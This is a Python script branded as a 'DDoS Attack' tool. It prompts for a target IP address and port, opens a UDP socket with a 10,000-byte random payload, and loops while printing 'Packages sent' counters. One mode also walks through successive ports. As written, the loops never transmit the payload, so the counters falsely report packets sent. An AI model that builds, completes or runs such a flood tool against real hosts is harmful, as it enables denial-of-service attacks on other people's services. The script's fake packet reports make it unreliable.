def banner():
	print("""\033[91m   ___  ___             ___  __  __           __  
  / _ \/ _ \___  ___   / _ |/ /_/ /____ _____/ /__
 / // / // / _ \(_-<  / __ / __/ __/ _ `/ __/  '_/
/____/____/\___/___/ /_/ |_\__/\__/\_,_/\__/_/\_\ 
                                                                                                           Version 1.0                                            """)
def all():
	from time import sleep
	from os import system
	import socket
	import random
	system("clear")
	banner()
	print(f"""\033[35m-----------------------------
| GitHub : Galo-Uatizapi    |
| Instagram : @kypton_usr   |
| YouTube : Cookie $        |
-----------------------------
\033[m""")                                                              
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(10000)
	try:
		print("\033[32mEnter target IP \033[m\033[m", end=": ")
		ip = input("\033[36m")
		print("\033[32mEnter target port \033[m\033[m", end=": ")
		port = int(input("\033[36m"))
		sock.connect((ip, port))
	except Exception as e:
		print(f"""\033[31mSomething went wrong!
Reason: \033[33m{e}\033[m""")
		sleep(2)
		all()
	sleep(1.5)
	while True:
		print("""
\033[m[ \033[93m1 \033[m] \033[93mSingle line
\033[m[ \033[93m2 \033[m] \033[93mMultiple lines\033[m""")
		lines=str(input("\033[32m>> \033[36m"))
		if lines=="1":
			sleep(1.5)
			system("clear")
			banner()
			print("""\033[35m\033[93mType \033[32mCTRL + C \033[93mto cancel the attack.\033[m""")
			try:
				for i in range(1, 100**1000):
					print(f"\033[35mPackages sent \033[m: \033[36m{i}\033[m", end="\r")
			except Exception as e:
				print(f"""------------------------------
\033[91mProgram ending.
Reason: \033[33m{e}\033[m
------------------------------""")
				exit()
			except KeyboardInterrupt:
				print("""-----------------------------------
\033[33mProgam ending! check back often!\033[m
------------------------------------""")
				break
		elif lines=="2":
			sleep(1.5)
			try:
				for i in range(1, 100**1000):
					color=["\033[m","\033[31m","\033[32m","\033[33m","\033[34m","\033[35m", "\033[36m","\033[37m"]
					print(f"DDos-Attack | {random.choice(color)}Package {i} sent to {ip} through the door {port}\033[m")
					port=port+1
			except Exception as e:
				print(f"""------------------------------
\033[91mProgram ending.
Reason: \033[33m{e}\033[m
------------------------------""")
				break
				exit()
			except KeyboardInterrupt:
				print("-"*30,"""
\033[33mProgam ending! check back often!\033[m
------------------------------""")
				exit()
		else:
			print("\033[m[ \033[91m! \033[m] \033[91mInvalid option. Try again.\033[m")
			sleep(2)
			system("clear")
			all()
if __name__=="__main__":
	all()
